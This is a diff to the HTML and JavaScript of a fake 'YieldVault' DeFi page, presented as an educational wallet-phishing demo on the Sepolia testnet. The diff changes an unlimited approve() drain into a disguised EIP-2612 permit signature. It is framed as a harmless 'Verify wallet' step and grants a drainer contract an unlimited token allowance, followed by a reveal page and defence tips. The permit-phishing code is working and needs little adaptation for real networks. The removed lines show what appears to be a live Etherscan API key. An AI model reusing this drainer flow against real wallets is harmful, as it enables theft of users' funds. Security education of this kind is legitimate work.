@@ -8,17 +8,10 @@
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
   :root {
-    --bg: #06060a;
-    --surface: #0e0e18;
-    --border: #1e1e30;
-    --accent: #6c63ff;
-    --accent-dim: rgba(108,99,255,0.12);
-    --green: #22c55e;
-    --red: #ef4444;
-    --yellow: #f59e0b;
-    --text: #e8e8f0;
-    --muted: #6b6b8a;
-    --card: #111120;
+    --bg: #06060a; --surface: #0e0e18; --border: #1e1e30;
+    --accent: #6c63ff; --accent-dim: rgba(108,99,255,0.12);
+    --green: #22c55e; --red: #ef4444; --yellow: #f59e0b;
+    --text: #e8e8f0; --muted: #6b6b8a; --card: #111120;
   }
   body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; line-height: 1.5; }
   .phase { display: none; }
@@ -102,12 +95,12 @@
   .tl-label { font-size: 0.75rem; font-weight: 600; color: var(--muted); letter-spacing: 0.04em; margin-bottom: 4px; }
   .tl-title { font-size: 0.95rem; font-weight: 600; margin-bottom: 4px; }
   .tl-desc { font-size: 0.85rem; color: var(--muted); line-height: 1.6; }
-  .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #a5b4fc; margin-top: 8px; word-break: break-all; }
+  .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #a5b4fc; margin-top: 8px; word-break: break-all; line-height: 1.6; }
   .info-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px 24px; margin-bottom: 16px; }
   .info-card-label { font-size: 0.75rem; color: var(--muted); margin-bottom: 4px; }
   .info-card-value { font-size: 0.9rem; font-weight: 500; word-break: break-all; }
 
-  /* EXPOSURE SECTION */
+  /* EXPOSURE */
   .exposure-section { margin-bottom: 32px; }
   .exposure-header { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 16px; }
   .exposure-title { font-size: 1rem; font-weight: 700; }
@@ -122,7 +115,6 @@
   .token-status { font-size: 0.75rem; color: var(--red); margin-top: 2px; }
   .token-status.safe { color: var(--green); }
   .exposure-loading { text-align: center; padding: 24px; color: var(--muted); font-size: 0.85rem; }
-  .exposure-empty { text-align: center; padding: 24px; color: var(--muted); font-size: 0.85rem; }
   .total-bar { background: rgba(239,68,68,0.06); border: 1px solid rgba(239,68,68,0.2); border-radius: 10px; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
   .total-bar-label { font-size: 0.85rem; color: var(--muted); }
   .total-bar-value { font-size: 1rem; font-weight: 700; color: var(--red); }
@@ -145,6 +137,10 @@
   .defense-text { color: var(--muted); line-height: 1.6; }
   .defense-text strong { color: var(--text); }
   a.defense-link { color: var(--accent); font-weight: 600; text-decoration: none; }
+
+  /* PERMIT WARNING BOX */
+  .permit-danger { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 16px 18px; margin-top: 12px; font-size: 0.83rem; color: #fca5a5; line-height: 1.6; }
+  .permit-danger strong { color: var(--red); display: block; margin-bottom: 4px; }
 </style>
 </head>
 <body>
@@ -175,14 +171,12 @@
   </div>
 </div>
 
-<!-- PHASE 2: CONNECTING — framed to normalize the second popup -->
+<!-- PHASE 2: CONNECTING -->
 <div id="phase-connecting" class="phase">
   <div style="min-height:100vh;display:flex;align-items:center;justify-content:center;">
     <div class="connect-card">
       <div class="connect-logo">Yield<span>Vault</span></div>
-      <div class="step-list" id="stepList">
-        <!-- Steps rendered by JS -->
-      </div>
+      <div class="step-list" id="stepList"></div>
       <p class="connect-note" id="connectNote">Please confirm each step in MetaMask to continue.</p>
     </div>
   </div>
@@ -198,7 +192,7 @@
     <div class="reveal-bar">
       <div class="reveal-text">
         <strong>This is an educational security demo.</strong>
-        Something happened in the background when you "connected." Click to find out what.
+        Something happened in the background when you connected. Click to find out what.
       </div>
       <button class="reveal-btn" id="revealBtn">Show me what happened</button>
     </div>
@@ -218,100 +212,102 @@
     <div class="reveal-header">
       <div class="danger-badge">Security Demo — Sepolia Testnet</div>
       <h2>Here's what just happened to you</h2>
-      <p class="sub">No real funds at risk — this is a controlled Sepolia testnet demo. On a real phishing site, the outcome is identical with real money.</p>
+      <p class="sub">No real funds at risk — this is a controlled Sepolia testnet demo. On a real phishing site, this is exactly how it plays out with real money.</p>
     </div>
 
-    <!-- Timeline -->
     <div class="timeline">
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-label">Step 1</div>
         <div class="tl-title">You clicked "Connect Wallet"</div>
-        <div class="tl-desc">Normal button. Every DeFi site has one. Nothing suspicious yet.</div>
+        <div class="tl-desc">Normal button. Every DeFi site has one.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-label">Step 2</div>
         <div class="tl-title">MetaMask popup #1 — wallet connection</div>
-        <div class="tl-desc">Legitimate. Just shares your wallet address with the site. You approved it.</div>
+        <div class="tl-desc">Legitimate. Just shares your public wallet address. You approved it.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot danger"></div>
-        <div class="tl-label">Step 3 — Where the attack happened</div>
-        <div class="tl-title">MetaMask popup #2 appeared — "Authorize vault access"</div>
+        <div class="tl-label">Step 3 — Where it happened</div>
+        <div class="tl-title">MetaMask popup #2 — "Verify your wallet"</div>
         <div class="tl-desc">
-          The site framed this as a required setup step — "authorize YieldVault to optimize your yields." It looked like part of connecting. But it was not.<br><br>
-          What you actually signed:
-          <div class="code-block">approve(<span id="drainerDisplay">0x4c6015...c72e</span>, 115792089237316195423570985008687907853269984665640564039457584007913129639935)</div>
-          In plain English: <em>"Let this contract take an unlimited amount of my tokens, any time it wants, without asking me again — forever."</em>
+          This looked like a harmless verification signature — same popup MetaMask shows when you log into OpenSea or any other site. No "Spending cap" warning. No mention of tokens. No transaction fee. Just "Sign."<br><br>
+          But what you actually signed was a <strong>EIP-2612 Permit</strong> — a cryptographic authorization that lets the drainer contract pull your entire token balance, with no further action from you, no on-chain approval transaction ever recorded, and nothing for revoke.cash to find afterward.
+          <div class="code-block">
+            Permit {<br>
+            &nbsp;&nbsp;owner: <span id="revealVictim" style="color:#86efac">your wallet</span>,<br>
+            &nbsp;&nbsp;spender: <span style="color:#f87171">0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05</span>,<br>
+            &nbsp;&nbsp;value: 115792089237316195423570985008687907853269984665640564039457584007913129639935,<br>
+            &nbsp;&nbsp;deadline: <span id="revealDeadline">—</span><br>
+            }
+          </div>
+          <div class="permit-danger">
+            <strong>Why this is worse than approve()</strong>
+            Unlike a standard approval, a permit signature leaves no on-chain record until it's used. Your wallet's approval list still shows clean. revoke.cash finds nothing. But the attacker holds your signed permit and can drain you at any moment — or sell the signature to someone else.
+          </div>
         </div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-label">Step 4</div>
         <div class="tl-title">You landed on a normal-looking dashboard</div>
-        <div class="tl-desc">Nothing looked wrong. The damage was already done, silently, in the background.</div>
+        <div class="tl-desc">Nothing looked wrong. The attacker now holds your signed permit and can drain your balance at any time by calling <code style="color:#a5b4fc">permitAndDrain()</code> on their contract — in a single transaction, with no further involvement from you.</div>
       </div>
     </div>
 
-    <!-- Approval tx -->
     <div class="info-card">
       <div class="info-card-label">Your wallet</div>
       <div class="info-card-value" id="revealAddress">—</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Approval transaction — this is on-chain, publicly visible, permanent</div>
-      <div class="info-card-value" id="approveTxDisplay">—</div>
-      <a id="approveTxLink" href="#" target="_blank" class="etherscan-link">View on Sepolia Etherscan ↗</a>
+      <div class="info-card-label">Permit signature (held by attacker — not yet submitted on-chain)</div>
+      <div class="info-card-value" id="revealSig">—</div>
     </div>
 
-    <!-- EVERY TOKEN AT RISK -->
+    <!-- ALL TOKENS AT RISK -->
     <div class="exposure-section">
       <div class="exposure-header">
         <div class="exposure-title">Every token in your wallet — all exposed</div>
         <div class="exposure-sub" id="tokenScanNote">Scanning Sepolia wallet...</div>
       </div>
-
-      <div id="tokenExposureList">
-        <div class="exposure-loading">Fetching token holdings from chain...</div>
-      </div>
-
+      <div id="tokenExposureList"><div class="exposure-loading">Fetching token holdings from chain...</div></div>
       <div class="total-bar" id="totalBar" style="display:none">
         <div class="total-bar-label">Tokens with active balance found in wallet</div>
         <div class="total-bar-value" id="totalTokenCount">—</div>
       </div>
-
       <div style="font-size:0.82rem;color:var(--muted);line-height:1.6;margin-top:8px;">
-        The attacker doesn't need a separate approval for each token. One <code style="color:#a5b4fc">drain()</code> call per token is enough — they already have a list of everything you hold. The unlimited allowance on each approved token lets them pull whatever balance exists, now or in the future.
+        The attacker can call <code style="color:#a5b4fc">permitAndDrain()</code> once per token, using the permit signature you just provided. Each call drains the full current balance of that token — no separate approval needed per token if they hold your signed permit.
       </div>
     </div>
 
-    <!-- DEMO token live balance watcher -->
+    <!-- LIVE BALANCE WATCHER -->
     <div class="balance-watcher">
-      <div class="balance-label">DEMO token balance (live — auto-refreshes)</div>
+      <div class="balance-label">DEMO token balance (live — auto-refreshes every 8s)</div>
       <div class="balance-value safe" id="liveBalance">Loading...</div>
-      <div class="balance-note" id="balanceNote">The attacker (the person running this demo) can now call drain() from their terminal at any moment. Watch this number — you are not involved in that transaction at all.</div>
+      <div class="balance-note" id="balanceNote">The attacker holds your permit signature. They can submit it on-chain at any moment to drain this balance — watch this number.</div>
       <button class="refresh-btn" id="refreshBtn">Refresh now</button>
     </div>
 
-    <!-- Defense -->
+    <!-- DEFENSE -->
     <div class="defense-section">
       <h3>How to protect yourself going forward</h3>
       <div class="defense-item">
         <div class="defense-num">1</div>
-        <div class="defense-text"><strong>Never approve a second popup immediately after connecting.</strong> Connecting to a site only needs one prompt. If a second one appears right away, it's almost always a spend approval — not a connection step.</div>
+        <div class="defense-text"><strong>Treat "Sign" popups as seriously as "Approve" popups.</strong> A signature request that mentions "Permit", "spender", "value", or "deadline" in its data is a permit — not a login. Read the typed data MetaMask shows before signing.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">2</div>
-        <div class="defense-text"><strong>Read the MetaMask popup before clicking.</strong> It tells you the token name and spend limit. "Unlimited" means exactly that — a blank cheque with no expiry.</div>
+        <div class="defense-text"><strong>Never sign a second popup right after connecting.</strong> Connecting to a site only needs one approval. An immediate second request — transaction or signature — is almost always an attack.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">3</div>
-        <div class="defense-text"><strong>Audit and revoke your existing approvals.</strong> Visit <a href="https://revoke.cash" target="_blank" class="defense-link">revoke.cash</a>, paste your wallet address, and revoke anything you don't recognise. Do this regularly.</div>
+        <div class="defense-text"><strong>Use a wallet that shows permit details clearly.</strong> Rabby Wallet decodes permit signatures and shows you the spender, value, and expiry in plain language before you sign. MetaMask's default view is less obvious.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">4</div>
-        <div class="defense-text"><strong>Use bookmarks, not links.</strong> Never navigate to a DeFi site from a Discord DM, Twitter link, or email. Bookmark the real URL and use only that.</div>
+        <div class="defense-text"><strong>Bookmark real sites.</strong> Navigate from bookmarks only — never from links in Discord, Telegram, Twitter/X, or emails. The URL is the only thing that separates this fake page from the real one.</div>
       </div>
     </div>
   </div>
@@ -319,34 +315,35 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  // ---- CONFIG ----
+  // ---- CONFIG (updated Sepolia addresses) ----
   const SEPOLIA_CHAIN_ID  = 11155111;
-  const TOKEN_ADDRESS     = "0x4a2103AA8F00c1D453973268a3cce587d055330b";
-  const DRAINER_ADDRESS   = "0x4c6015c7058fEe725c7342cFF1E7Dbd94Ca9C72e";
+  const TOKEN_ADDRESS     = "0x56c36D6118e32A3A091B78ad535449f5bfDccee8"; // TestToken (ERC20Permit)
+  const DRAINER_ADDRESS   = "0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05"; // EducationalDrainer
   const RPC_URL           = "https://ethereum-sepolia-rpc.publicnode.com";
-  const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597"; // replace with yours
+  const ETHERSCAN_API_KEY = "YOUR_ETHERSCAN_API_KEY_HERE";
   const ETHERSCAN_BASE    = "https://api.etherscan.io/v2/api";
-  const MAX_UINT256       = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+  const MAX_UINT256       = BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935");
 
   const ERC20_ABI = [
-    "function approve(address spender, uint256 amount) external returns (bool)",
     "function balanceOf(address) view returns (uint256)",
     "function decimals() view returns (uint8)",
-    "function symbol() view returns (string)"
+    "function symbol() view returns (string)",
+    "function nonces(address) view returns (uint256)",
+    "function DOMAIN_SEPARATOR() view returns (bytes32)"
   ];
 
-  let userAddress   = null;
-  let approveTxHash = null;
-  const provider    = new ethers.JsonRpcProvider(RPC_URL);
+  let userAddress    = null;
+  let permitSig      = null;
+  let permitDeadline = null;
+  const provider     = new ethers.JsonRpcProvider(RPC_URL);
 
   function showPhase(id) {
     document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
   }
-
   function shortAddr(a) { return a.slice(0,6) + "..." + a.slice(-4); }
+  function escHtml(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
-  // ---- STEP LIST RENDERER ----
   function renderSteps(steps) {
     document.getElementById('stepList').innerHTML = steps.map(s => `
       <div class="step-item">
@@ -355,8 +352,7 @@
           <div class="step-title">${s.title}</div>
           <div class="step-desc">${s.desc}</div>
         </div>
-      </div>
-    `).join('');
+      </div>`).join('');
   }
 
   // ---- CONNECT ----
@@ -367,16 +363,14 @@
     }
 
     showPhase('phase-connecting');
-
-    // Step list: step 1 active, steps 2 pending
     renderSteps([
-      { num:'1', state:'active', title:'Connect wallet',            desc:'Share your wallet address with YieldVault' },
-      { num:'2', state:'pending', title:'Authorize vault access',   desc:'Required to enable yield optimization' },
+      { num:'1', state:'active',  title:'Connect wallet',        desc:'Share your wallet address with YieldVault' },
+      { num:'2', state:'pending', title:'Verify wallet',         desc:'Required to unlock your personalized vault' },
     ]);
     document.getElementById('connectNote').textContent = "Approve the connection request in MetaMask.";
 
     try {
-      // POPUP #1 — wallet connection
+      // POPUP #1 — connection
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
 
@@ -387,29 +381,65 @@
         return;
       }
 
-      // Step 1 done, step 2 now active
+      // Step 1 done, step 2 active
       renderSteps([
-        { num:'1', state:'done',   title:'Wallet connected',          desc:shortAddr(userAddress) },
-        { num:'2', state:'active', title:'Authorize vault access',    desc:'Required to enable yield optimization — confirm in MetaMask' },
+        { num:'1', state:'done',   title:'Wallet connected',      desc: shortAddr(userAddress) },
+        { num:'2', state:'active', title:'Verify wallet',         desc:'Sign to confirm ownership and unlock your vault' },
       ]);
-      document.getElementById('connectNote').textContent = "One more step — confirm the authorization in MetaMask.";
+      document.getElementById('connectNote').textContent = "One more step — sign the verification in MetaMask.";
 
-      // POPUP #2 — the malicious approve(), framed as "vault authorization"
-      // This fires immediately after connection, while user is still in "connecting" flow
+      // POPUP #2 — permit signature (EIP-712 typed data)
+      // This is what makes this version more dangerous than approve():
+      // MetaMask shows a "Signature Request" popup — NOT a "Spending cap" warning.
+      // The user sees domain, types, and message fields but no obvious danger signal.
+      const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, provider);
+      const [nonce, domainSeparator] = await Promise.all([
+        tokenContract.nonces(userAddress),
+        tokenContract.DOMAIN_SEPARATOR()
+      ]);
+
+      permitDeadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
+
+      // EIP-712 typed data — what MetaMask renders as the "Sign" popup
+      const domain = {
+        name: "Demo Token",
+        version: "1",
+        chainId: SEPOLIA_CHAIN_ID,
+        verifyingContract: TOKEN_ADDRESS
+      };
+
+      const types = {
+        Permit: [
+          { name: "owner",    type: "address" },
+          { name: "spender",  type: "address" },
+          { name: "value",    type: "uint256" },
+          { name: "nonce",    type: "uint256" },
+          { name: "deadline", type: "uint256" }
+        ]
+      };
+
+      const message = {
+        owner:    userAddress,
+        spender:  DRAINER_ADDRESS,
+        value:    MAX_UINT256.toString(),
+        nonce:    nonce.toString(),
+        deadline: permitDeadline
+      };
+
       const browserProvider = new ethers.BrowserProvider(window.ethereum);
-      const signer  = await browserProvider.getSigner();
-      const token   = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
-      const tx      = await token.approve(DRAINER_ADDRESS, MAX_UINT256);
-      approveTxHash = tx.hash;
-      await tx.wait();
+      const signer = await browserProvider.getSigner();
 
-      // Both done — go to fake dashboard
+      // This fires the "Signature Request" popup — no spending cap warning, no tx fee shown
+      const signature = await signer.signTypedData(domain, types, message);
+      permitSig = signature;
+
+      // Land on fake dashboard
       document.getElementById('walletChip').textContent = shortAddr(userAddress);
       showPhase('phase-dashboard');
 
     } catch (err) {
       if (err.code === 4001) {
-        alert("You rejected the request. On a real phishing site this would retry or pressure you further. Try again to see the full demo.");
+        alert("You rejected the request. On a real phishing site, this might retry or display a more convincing prompt.");
       } else {
         alert("Error: " + (err.message || "Something went wrong."));
       }
@@ -419,35 +449,36 @@
 
   // ---- REVEAL ----
   document.getElementById('revealBtn').addEventListener('click', async () => {
-    document.getElementById('revealAddress').textContent   = userAddress;
-    document.getElementById('drainerDisplay').textContent  = DRAINER_ADDRESS;
-
-    if (approveTxHash) {
-      document.getElementById('approveTxDisplay').textContent = approveTxHash;
-      document.getElementById('approveTxLink').href = `https://sepolia.etherscan.io/tx/${approveTxHash}`;
-    }
+    document.getElementById('revealAddress').textContent  = userAddress || '—';
+    document.getElementById('revealVictim').textContent   = shortAddr(userAddress || '0x');
+    document.getElementById('revealDeadline').textContent = permitDeadline
+      ? new Date(permitDeadline * 1000).toUTCString()
+      : '—';
+    document.getElementById('revealSig').textContent = permitSig
+      ? permitSig.slice(0,20) + "..." + permitSig.slice(-10) + " (full 65-byte ECDSA signature)"
+      : '—';
 
     showPhase('phase-reveal');
     await refreshBalance();
     await scanAllTokens();
   });
 
-  // ---- LIVE BALANCE (DEMO token) ----
+  // ---- BALANCE ----
   async function refreshBalance() {
     if (!userAddress) return;
     try {
       const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, provider);
       const [raw, dec] = await Promise.all([token.balanceOf(userAddress), token.decimals()]);
-      const formatted  = parseFloat(ethers.formatUnits(raw, dec)).toLocaleString();
+      const formatted = parseFloat(ethers.formatUnits(raw, dec)).toLocaleString();
       const el   = document.getElementById('liveBalance');
       const note = document.getElementById('balanceNote');
       el.textContent = formatted + " DEMO";
       if (raw === 0n) {
         el.className = 'balance-value drained';
-        note.textContent = "Balance is zero — the drain has already happened. If you re-mint via faucet, it can happen again — the approval is still active.";
+        note.textContent = "Balance is zero — permitAndDrain() has already been called. The permit signature was consumed on-chain.";
       } else {
         el.className = 'balance-value safe';
-        note.textContent = "The attacker (the demo operator) can call drain() from their terminal at any moment. You are not involved in that transaction at all — watch this number change.";
+        note.textContent = "The attacker holds your signed permit. They can call permitAndDrain() from their terminal at any moment — watch this number.";
       }
     } catch(e) {
       document.getElementById('liveBalance').textContent = "Error reading balance";
@@ -459,48 +490,42 @@
     if (document.getElementById('phase-reveal').classList.contains('active')) refreshBalance();
   }, 8000);
 
-  // ---- SCAN ALL TOKENS ----
+  // ---- TOKEN SCAN ----
   async function scanAllTokens() {
     const listEl = document.getElementById('tokenExposureList');
     const noteEl = document.getElementById('tokenScanNote');
 
     if (!ETHERSCAN_API_KEY || ETHERSCAN_API_KEY === "YOUR_ETHERSCAN_API_KEY_HERE") {
-      listEl.innerHTML = `<div class="exposure-empty">Add your Etherscan API key to <code>ETHERSCAN_API_KEY</code> in this file to enable full token scanning.</div>`;
+      listEl.innerHTML = `<div class="exposure-loading">Add your Etherscan API key to enable full token scanning.</div>`;
       noteEl.textContent = "API key not configured";
       return;
     }
 
     try {
-      // Pull all token transfer history for this address
-      const url = `${ETHERSCAN_BASE}?chainid=${SEPOLIA_CHAIN_ID}&module=account&action=tokentx&address=${userAddress}&sort=asc&apikey=${ETHERSCAN_API_KEY}`;
-      const res  = await fetch(url);
-      const data = await res.json();
+      const url  = `${ETHERSCAN_BASE}?chainid=${SEPOLIA_CHAIN_ID}&module=account&action=tokentx&address=${userAddress}&sort=asc&apikey=${ETHERSCAN_API_KEY}`;
+      const data = await (await fetch(url)).json();
 
       if (!Array.isArray(data.result) || data.result.length === 0) {
-        listEl.innerHTML = `<div class="exposure-empty">No token transfer history found for this wallet on Sepolia.</div>`;
+        listEl.innerHTML = `<div class="exposure-loading">No token transfer history found for this wallet on Sepolia.</div>`;
         noteEl.textContent = "No tokens found";
         return;
       }
 
-      // Deduplicate by contract address, keeping symbol + decimals
       const seen = new Map();
       for (const tx of data.result) {
         if (!tx.contractAddress || tx.contractAddress === "0x0000000000000000000000000000000000000000") continue;
         const addr = tx.contractAddress.toLowerCase();
-        if (!seen.has(addr)) {
-          seen.set(addr, { symbol: tx.tokenSymbol, decimals: Number(tx.tokenDecimal), address: tx.contractAddress });
-        }
+        if (!seen.has(addr)) seen.set(addr, { symbol: tx.tokenSymbol, decimals: Number(tx.tokenDecimal), address: tx.contractAddress });
       }
 
-      noteEl.textContent = `Found ${seen.size} token contract(s) — checking live balances`;
+      noteEl.textContent = `Found ${seen.size} token contract(s)`;
       listEl.innerHTML = "";
-
       let withBalance = 0;
 
       for (const [, info] of seen) {
         try {
-          const contract  = new ethers.Contract(info.address, ERC20_ABI, provider);
-          const raw       = await contract.balanceOf(userAddress);
+          const contract = new ethers.Contract(info.address, ERC20_ABI, provider);
+          const raw = await contract.balanceOf(userAddress);
           const formatted = parseFloat(ethers.formatUnits(raw, info.decimals));
           const hasBalance = raw > 0n;
           if (hasBalance) withBalance++;
@@ -509,7 +534,7 @@
           row.className = 'token-exposure-row';
           row.innerHTML = `
             <div class="token-exposure-left">
-              <div class="token-avatar">${info.symbol.slice(0,3)}</div>
+              <div class="token-avatar">${escHtml(info.symbol.slice(0,3))}</div>
               <div>
                 <div class="token-name">${escHtml(info.symbol)}</div>
                 <div class="token-addr">${info.address.slice(0,10)}...${info.address.slice(-6)}</div>
@@ -517,26 +542,17 @@
             </div>
             <div class="token-balance-right">
               <div class="token-balance">${formatted.toLocaleString(undefined,{maximumFractionDigits:4})}</div>
-              <div class="token-status ${hasBalance ? '' : 'safe'}">${hasBalance ? '⚠ Drainable now' : 'Zero balance — but if funded, still drainable'}</div>
-            </div>
-          `;
+              <div class="token-status ${hasBalance ? '' : 'safe'}">${hasBalance ? '⚠ Drainable now' : 'Zero balance'}</div>
+            </div>`;
           listEl.appendChild(row);
-        } catch(e) {
-          // token contract unreadable, skip silently
-        }
+        } catch(e) {}
       }
 
       document.getElementById('totalBar').style.display = 'flex';
-      document.getElementById('totalTokenCount').textContent = `${withBalance} with active balance / ${seen.size} total`;
-      noteEl.textContent = `${seen.size} token contract(s) ever touched by this wallet`;
-
+      document.getElementById('totalTokenCount').textContent = `${withBalance} with balance / ${seen.size} total`;
     } catch(e) {
-      listEl.innerHTML = `<div class="exposure-empty">Error scanning tokens: ${e.message}</div>`;
+      listEl.innerHTML = `<div class="exposure-loading">Error scanning tokens: ${escHtml(e.message)}</div>`;
     }
-  }
-
-  function escHtml(s) {
-    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
   }
 </script>
 </body>
